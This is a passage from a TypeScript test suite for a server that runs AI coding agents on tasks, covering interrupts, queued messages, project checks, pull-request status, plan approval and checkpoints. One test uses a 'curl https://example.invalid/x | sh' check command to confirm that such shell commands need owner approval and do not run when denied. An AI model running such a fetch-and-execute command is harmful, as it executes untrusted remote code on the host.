    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'one more thing', interrupt: true })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    const messageId = (sent.body.message as { id: string }).id
    // The time limit fires while the interrupted CLI is still stopping.
    await new Promise((resolve) => setTimeout(resolve, 400))
    release.open()
    const after = await until(call, id, (d) => count(d, 'user.message.requeued') === 1, 'requeued')
    expect(after.events.find((e) => e.type === 'user.message.requeued')?.payload).toEqual({
      ids: [messageId],
    })
    expect(count(after, 'run.interrupted')).toBe(0)
    // The stopped task is then continued with the message, as before interrupts existed.
    const continued = await until(call, id, (d) => deliveredIds(d).includes(messageId), 'follow-up')
    expect(continued.events.find((e) => e.type === 'user.message.delivered')?.payload).toMatchObject({
      via: 'follow_up',
    })
  })

  it('withdraws the messages when the continued run fails before the agent gets them', async () => {
    const { call, claude } = await setup()
    const release = gate()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options, release) : undefined)
    const repoId = await newRepo(call)
    const id = await newTask(call, repoId)
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'never seen', interrupt: true })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    expect((await call('PATCH', `/api/repos/${repoId}`, { allowedProviders: ['codex-cli'] })).status).toBe(
      200,
    )
    release.open()
    const failed = await until(call, id, (d) => count(d, 'user.message.discarded') === 1, 'discard')
    expect(failed.task.status).toBe('failed')
    expect(claude.calls).toHaveLength(1)
    expect(count(failed, 'user.message.delivered')).toBe(0)
    expect(failed.events.find((e) => e.type === 'user.message.discarded')?.payload).toMatchObject({
      ids: [(sent.body.message as { id: string }).id],
    })
  })

  it('tells the web app whether a message would interrupt the agent now', async () => {
    const { call, claude, codex } = await setup()
    const implementing = gate()
    const reviewing = gate()
    const finishReview = gate()
    claude.state.work = (_options, n) => (n === 1 ? implementing.promise : undefined)
    codex.state.reviewWork = () => {
      reviewing.open()
      return finishReview.promise
    }
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    const working = await until(
      call,
      id,
      (d) =>
        d.task.status === 'running' &&
        claude.calls.length === 1 &&
        d.events.some(
          (e) => e.type === 'agent' && (e.payload.event as { type?: string }).type === 'session_started',
        ),
      'implementing',
    )
    expect(working).toMatchObject({ interruptible: true })
    implementing.open()
    await reviewing.promise
    expect(await details(call, id)).toMatchObject({ interruptible: false })
    finishReview.open()
    expect(await until(call, id, settled('done'), 'done')).toMatchObject({ interruptible: false })
  })

  it('still interrupts a run that could be steered when interrupt: true is asked for', async () => {
    const { call, claude } = await setup()
    claude.state.steer = () => true
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options) : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.steerable === true, 'steerable')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Stop and redo', interrupt: true })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    const done = await until(call, id, settled('done'), 'done')
    expect(claude.steered).toEqual([])
    expect(count(done, 'run.interrupted')).toBe(1)
    expect(claude.calls[1]?.prompt).toContain('Stop and redo')
  })

  it('queues instead of interrupting when asked to', async () => {
    const { call, claude } = await setup()
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'later', interrupt: false })
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    expect(claude.calls[0]?.signal.aborted).toBe(false)
    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'x', interrupt: 'yes' })).status).toBe(
      400,
    )
    wait.open()
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'follow-up')
    expect(claude.calls[1]?.prompt).toContain('later')
  })
})

describe('owner messages that were not delivered', () => {
  it('leaves discarded messages out of what the reviewer is told later', async () => {
    const { call, claude, codex } = await setup()
    claude.state.work = (options, n) =>
      n === 1
        ? new Promise((resolve) => options.signal.addEventListener('abort', () => resolve(), { once: true }))
        : undefined
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    await until(call, id, settled('running'), 'running')
    await call('POST', `/api/tasks/${id}/messages`, { text: 'DISCARDED-INSTRUCTION', interrupt: false })
    await call('POST', `/api/tasks/${id}/cancel`)
    await until(
      call,
      id,
      (d) => d.task.status === 'cancelled' && count(d, 'user.message.discarded') === 1,
      'x',
    )
    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'KEPT-INSTRUCTION' })).status).toBe(202)
    await until(call, id, settled('done'), 'done')
    expect(codex.calls[0]?.prompt).toContain('KEPT-INSTRUCTION')
    expect(codex.calls[0]?.prompt).not.toContain('DISCARDED-INSTRUCTION')
  })

  it('brings an archived task back to the list when the owner continues it', async () => {
    const { call } = await setup()
    const id = await newTask(call, await newRepo(call))
    await until(call, id, settled('done'), 'done')
    await call('PATCH', `/api/tasks/${id}`, { archived: true })
    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'one more thing' })).status).toBe(202)
    const done = await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'x')
    expect(done.task.archived).toBe(false)
    expect(done.events.filter((e) => e.type === 'task.updated').at(-1)?.payload).toEqual({ archived: false })
  })
})

describe('project checks', () => {
  it('validates, sets and clears the repository check command', async () => {
    const { call } = await setup()
    const repoId = await newRepo(call)
    expect((await call('PATCH', `/api/repos/${repoId}`, { checkCommand: 'pnpm check' })).status).toBe(400)
    expect((await call('PATCH', `/api/repos/${repoId}`, { checkCommand: [] })).status).toBe(400)
    const set = await call('PATCH', `/api/repos/${repoId}`, { checkCommand: ['pnpm', 'check'] })
    expect(set.body.repo).toMatchObject({ checkCommand: ['pnpm', 'check'] })
    const cleared = await call('PATCH', `/api/repos/${repoId}`, { checkCommand: null })
    expect((cleared.body.repo as Record<string, unknown>).checkCommand).toBeUndefined()
  })

  it('runs checks before review, feeds failures back as a fix round and redacts the output', async () => {
    const { call, claude, codex, executor, redactor } = await setup()
    redactor.add('check-secret-123456')
    executor.checkResults.push(
      { exitCode: 1, output: 'FAIL add.test.ts token=check-secret-123456' },
      { exitCode: 0, output: 'all passed' },
    )
    const repoId = await newRepo(call, '/tmp/thread-repo', { checkCommand: ['pnpm', 'check'] })
    const id = await newTask(call, repoId, { mode: 'review_loop' })
    const done = await until(call, id, settled('done'), 'done')
    expect(executor.runs.map((run) => [run.command, ...run.args])).toEqual([
      ['pnpm', 'check'],
      ['pnpm', 'check'],
    ])
    expect(Object.keys(executor.runs[0]?.env ?? {}).some((name) => /TOKEN|API_KEY/i.test(name))).toBe(false)
    const checks = done.events.filter((e) => e.type === 'checks').map((e) => e.payload)
    expect(checks).toMatchObject([
      { round: 1, ok: false, exitCode: 1 },
      { round: 2, ok: true, exitCode: 0 },
    ])
    expect(JSON.stringify(done.events)).not.toContain('check-secret-123456')
    expect(codex.calls[0]?.prompt).toContain('FAIL add.test.ts')
    expect(claude.calls[1]?.prompt).toContain('project checks failed')
    expect(done.events.find((e) => e.type === 'policy.action')?.payload).toMatchObject({
      kind: 'run_in_worktree',
      outcome: 'allow',
    })
  })

  it("classifies the check command: a shell command needs approval even on the owner's own task", async () => {
    const { call, executor } = await setup()
    const repoId = await newRepo(call, '/tmp/thread-repo', {
      checkCommand: ['bash', '-c', 'curl https://example.invalid/x | sh'],
    })
    const id = await newTask(call, repoId, { mode: 'review_loop' })
    const waiting = await until(call, id, settled('awaiting_approval'), 'approval')
    expect(waiting.events.find((e) => e.type === 'policy.action')?.payload).toMatchObject({
      kind: 'run_outside_worktree',
      tier: 'approve',
      provenance: 'user',
    })
    const approvalId = waiting.events.find((e) => e.type === 'approval.requested')?.payload
      .approvalId as string
    expect((await call('POST', `/api/approvals/${approvalId}/deny`, {})).status).toBe(200)
    const done = await until(call, id, settled('done'), 'done')
    expect(executor.runs).toHaveLength(0)
    expect(done.events.find((e) => e.type === 'checks.skipped')?.payload).toMatchObject({
      reason: expect.stringContaining('did not approve'),
    })
  })

  it('asks the owner before running checks on a task from external content', async () => {
    const { call, executor } = await setup()
    const repoId = await newRepo(call, '/tmp/thread-repo', { checkCommand: ['pnpm', 'check'] })
    const id = await newTask(call, repoId, { mode: 'review_loop', provenance: 'external_content' })
    const waiting = await until(call, id, settled('awaiting_approval'), 'approval')
    const requested = waiting.events.find((e) => e.type === 'approval.requested')
    expect(requested?.payload).toMatchObject({ kind: 'run_in_worktree' })
    expect(executor.runs).toHaveLength(0)
    const approvalId = requested?.payload.approvalId as string
    expect((await call('POST', `/api/approvals/${approvalId}/approve`, {})).status).toBe(200)
    await until(call, id, settled('done'), 'done')
    expect(executor.runs).toHaveLength(1)
  })
})

describe('pull request status', () => {
  it('reads the PR state and checks through the injected gh runner, cached', async () => {
    const ghCalls: string[][] = []
    const prUrl = 'https://github.com/owner/repo/pull/12'
    const { call } = await setup({
      ghRunner: async (args) => {
        ghCalls.push(args)
        return JSON.stringify({
          url: prUrl,
          state: 'OPEN',
          isDraft: true,
          statusCheckRollup: [
            { __typename: 'CheckRun', name: 'test', status: 'COMPLETED', conclusion: 'FAILURE' },
            { __typename: 'CheckRun', name: 'lint', status: 'COMPLETED', conclusion: 'SUCCESS' },
            { __typename: 'CheckRun', name: 'e2e', status: 'QUEUED', conclusion: '' },
          ],
        })
      },
      publisher: { publish: async () => ({ pullRequestUrl: prUrl, commitSha: 'abc', body: 'b' }) },
    })
    const repoId = await newRepo(call, '/tmp/thread-repo', { githubRemote: 'https://github.com/owner/repo' })
    const id = await newTask(call, repoId)
    await until(call, id, settled('done'), 'done')
    expect((await call('GET', `/api/tasks/${id}/pr`)).status).toBe(404)
    expect((await call('POST', `/api/tasks/${id}/publish`, {})).status).toBe(200)
    const pr = await call('GET', `/api/tasks/${id}/pr`)
    expect(pr).toMatchObject({
      status: 200,
      body: {
        url: prUrl,
        state: 'OPEN',
        isDraft: true,
        checks: { passing: 1, failing: 1, pending: 1, failingNames: ['test'] },
      },
    })
    await call('GET', `/api/tasks/${id}/pr`)
    expect(ghCalls).toEqual([['pr', 'view', prUrl, '--json', 'url,state,isDraft,statusCheckRollup']])
  })

  it('keeps the worktree while the PR is open and removes it once the PR is merged', async () => {
    const prUrl = 'https://github.com/owner/repo/pull/14'
    let state = 'OPEN'
    const { call, claude } = await setup({
      ghRunner: async () => JSON.stringify({ url: prUrl, state, isDraft: false, statusCheckRollup: [] }),
      publisher: { publish: async () => ({ pullRequestUrl: prUrl, commitSha: 'abc', body: 'b' }) },
    })
    const repoId = await newRepo(call, '/tmp/thread-repo', { githubRemote: 'https://github.com/owner/repo' })
    const id = await newTask(call, repoId)
    await until(call, id, settled('done'), 'done')
    expect((await call('POST', `/api/tasks/${id}/publish`, {})).status).toBe(200)

    // Still there: the owner can ask the agent to fix CI and publish again to the same PR.
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Fix the failing test check' })
    expect(sent).toMatchObject({ status: 202, body: { message: { delivery: 'follow_up' } } })
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'follow-up')
    expect(claude.calls[1]).toMatchObject({ cwd: '/fake/worktree' })
    expect((await call('POST', `/api/tasks/${id}/publish`, {})).status).toBe(200)

    state = 'MERGED'
    expect((await call('GET', `/api/tasks/${id}/pr`)).body).toMatchObject({ state: 'MERGED' })
    const merged = await details(call, id)
    expect(merged.events.find((e) => e.type === 'worktree.removed')?.payload).toMatchObject({
      published: true,
      pullRequestState: 'merged',
    })
    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'one more' })).status).toBe(409)
  })

  it('answers 502 when gh fails', async () => {
    const prUrl = 'https://github.com/owner/repo/pull/13'
    const { call } = await setup({
      ghRunner: async () => {
        throw new Error('gh: not logged in')
      },
      publisher: { publish: async () => ({ pullRequestUrl: prUrl, commitSha: 'abc', body: 'b' }) },
    })
    const repoId = await newRepo(call, '/tmp/thread-repo', { githubRemote: 'https://github.com/owner/repo' })
    const id = await newTask(call, repoId)
    await until(call, id, settled('done'), 'done')
    await call('POST', `/api/tasks/${id}/publish`, {})
    expect(await call('GET', `/api/tasks/${id}/pr`)).toMatchObject({
      status: 502,
      body: { error: expect.stringContaining('not logged in') },
    })
  })
})

describe('plan first', () => {
  it('plans a single task read-only, waits for approval, then implements in the same session', async () => {
    const { call, claude } = await setup()
    const id = await newTask(call, await newRepo(call), { planFirst: true })
    const waiting = await until(call, id, settled('review_ready'), 'plan')
    expect(waiting.pendingPlan).toEqual({ plan: 'plan or result 1' })
    expect(claude.calls[0]).toMatchObject({ autonomy: 'read-only' })
    expect(claude.calls[0]?.prompt).toContain('implementation plan')
    expect((await call('POST', `/api/tasks/${id}/plan/approve`, { note: 'Go ahead' })).status).toBe(202)
    const done = await until(call, id, settled('done'), 'done')
    expect(done.pendingPlan).toBeNull()
    expect(claude.calls[1]).toMatchObject({
      autonomy: 'workspace-write',
      resumeSessionId: 'claude-cli-session',
    })
    expect(claude.calls[1]?.prompt).toContain('Go ahead')
    expect((await call('POST', `/api/tasks/${id}/plan/approve`, {})).status).toBe(409)
  })

  it('revises the plan when the owner answers with a message, and rejects it on request', async () => {
    const { call, claude, codex } = await setup()
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop', planFirst: true })
    await until(call, id, settled('review_ready'), 'plan')
    expect(codex.calls[0]?.prompt).toContain('plan or result 1')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Smaller, please' })
    expect(sent.body.message).toMatchObject({ delivery: 'replan' })
    const revised = await until(
      call,
      id,
      (d) => d.task.status === 'review_ready' && count(d, 'plan.awaiting_approval') === 2,
      'revised plan',
    )
    expect(claude.calls[1]).toMatchObject({ autonomy: 'read-only', resumeSessionId: 'claude-cli-session' })
    expect(claude.calls[1]?.prompt).toContain('Smaller, please')
    expect(revised.pendingPlan).toMatchObject({ plan: 'plan or result 2' })
    const rejected = await call('POST', `/api/tasks/${id}/plan/reject`, { note: 'Not now' })
    expect(rejected.body.task).toMatchObject({ status: 'cancelled' })
    expect(claude.calls).toHaveLength(2)
  })

  it('refuses plan first for compete tasks', async () => {
    const { call } = await setup()
    const repoId = await newRepo(call)
    const response = await call('POST', '/api/tasks', {
      repoId,
      title: 'x',
      prompt: 'x',
      mode: 'compete',
      planFirst: true,
    })
    expect(response.status).toBe(422)
  })
})

/** A one-commit repository with add.js, and where its worktrees go. */
function realRepo() {
  const root = tempDir('joy-checkpoints-')
  const repoPath = join(root, 'repo')
  const run = (...args: string[]) => execFileSync('git', args, { cwd: repoPath, stdio: 'pipe' }).toString()
  mkdirSync(repoPath)
  run('init', '-q', '-b', 'main')
  run('config', 'core.autocrlf', 'false')
  writeFileSync(join(repoPath, 'add.js'), 'start\n')
  run('add', '.')
  run('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init')
  return { repoPath, worktreesDir: join(root, 'worktrees') }
}

/** Restores slowly, so a second request reliably arrives while the first one is still restoring. */
class SlowRestoreExecutor extends WorktreeExecutor {
  override async restoreCheckpoint(...args: Parameters<WorktreeExecutor['restoreCheckpoint']>) {
    await new Promise((resolve) => setTimeout(resolve, 400))
    return super.restoreCheckpoint(...args)
  }
}

describe('checkpoints', () => {
  it('checkpoints each implementer turn and restores one, keeping the current state as a new checkpoint', async () => {
    const { repoPath, worktreesDir } = realRepo()
    const { call, claude } = await setup({ executor: new WorktreeExecutor({ worktreesDir }) })
    claude.state.work = (options, n) => writeFileSync(join(options.cwd, 'add.js'), `turn ${n}\n`)
    const id = await newTask(call, await newRepo(call, repoPath))
    const first = await until(call, id, settled('done'), 'done')
    const worktree = first.attempts[0]?.worktreePath as string
    await call('POST', `/api/tasks/${id}/messages`, { text: 'again' })
    await until(
      call,
      id,
      (d) => d.task.status === 'done' && count(d, 'checkpoint.created') === 2,
      'second turn',
    )
    expect(readFileSync(join(worktree, 'add.js'), 'utf8')).toBe('turn 2\n')

    const listed = (await call('GET', `/api/tasks/${id}/checkpoints`)).body.checkpoints as Array<
      Record<string, unknown>
    >
    expect(listed.map((c) => [c.n, c.ref, c.available])).toEqual([
      [1, `refs/joy/checkpoints/${id}/1`, true],
      [2, `refs/joy/checkpoints/${id}/2`, true],
    ])
    const restored = await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})
    expect(restored).toMatchObject({ status: 200, body: { restored: 1, savedAs: 3, discardedCommits: 0 } })
    expect(readFileSync(join(worktree, 'add.js'), 'utf8')).toBe('turn 1\n')
    expect(readFileSync(join(repoPath, 'add.js'), 'utf8')).toBe('start\n')
    expect((await call('POST', `/api/tasks/${id}/checkpoints/3/restore`, {})).status).toBe(200)
    expect(readFileSync(join(worktree, 'add.js'), 'utf8')).toBe('turn 2\n')
    expect((await call('POST', `/api/tasks/${id}/checkpoints/9/restore`, {})).status).toBe(404)

    // The agent hears about the restore with the next follow-up.
    await call('POST', `/api/tasks/${id}/messages`, { text: 'continue' })
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 3, 'third turn')
    expect(claude.calls[2]?.prompt).toContain('restored the worktree to checkpoint')
    // Several real repository operations per turn: slow on shared CI runners.
  }, 30_000)

  it('refuses to restore while the task runs', async () => {
    const { repoPath, worktreesDir } = realRepo()
    const { call, claude } = await setup({ executor: new WorktreeExecutor({ worktreesDir }) })
    const id = await newTask(call, await newRepo(call, repoPath))
    await until(call, id, settled('done'), 'done')
    const wait = gate()
    claude.state.work = () => wait.promise
    await call('POST', `/api/tasks/${id}/messages`, { text: 'more' })
    await until(call, id, settled('running'), 'running')
    expect(await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})).toMatchObject({
      status: 409,
      body: { error: expect.stringContaining('wait for it to finish') },
    })
    wait.open()
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'second run')
  }, 30_000)

  it('refuses checkpoints with an executor that keeps none', async () => {
    const { call } = await setup()
    const id = await newTask(call, await newRepo(call))
    await until(call, id, settled('done'), 'done')
    expect((await call('GET', `/api/tasks/${id}/checkpoints`)).body.checkpoints).toEqual([])
    expect(await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})).toMatchObject({
      status: 409,
      body: { error: expect.stringContaining('not available') },
    })
  })

  it('lets one owner action at a time touch a task: a restore blocks a second restore and a message', async () => {
    const { repoPath, worktreesDir } = realRepo()
    const { call, claude } = await setup({ executor: new SlowRestoreExecutor({ worktreesDir }) })
    claude.state.work = (options, n) => writeFileSync(join(options.cwd, 'add.js'), `turn ${n}\n`)
    const id = await newTask(call, await newRepo(call, repoPath))
    await until(call, id, settled('done'), 'done')
    const first = call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})
    await new Promise((resolve) => setTimeout(resolve, 150))
    const second = await call('POST', `/api/tasks/${id}/checkpoints/1/restore`, {})
    const message = await call('POST', `/api/tasks/${id}/messages`, { text: 'go on' })
    expect(second).toMatchObject({ status: 409, body: { error: expect.stringContaining('in progress') } })
    expect(message).toMatchObject({ status: 409, body: { error: expect.stringContaining('in progress') } })
    expect(await first).toMatchObject({ status: 200, body: { restored: 1, savedAs: 2 } })
    expect(claude.calls).toHaveLength(1)
    // Every checkpoint number is unique and each one can still be restored.
    const listed = (await call('GET', `/api/tasks/${id}/checkpoints`)).body.checkpoints as Array<{
      n: number
    }>
    expect(listed.map((c) => c.n)).toEqual([1, 2])
    expect((await call('POST', `/api/tasks/${id}/checkpoints/2/restore`, {})).status).toBe(200)
    expect((await call('POST', `/api/tasks/${id}/messages`, { text: 'go on' })).status).toBe(202)
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'follow-up')
  }, 30_000)
})
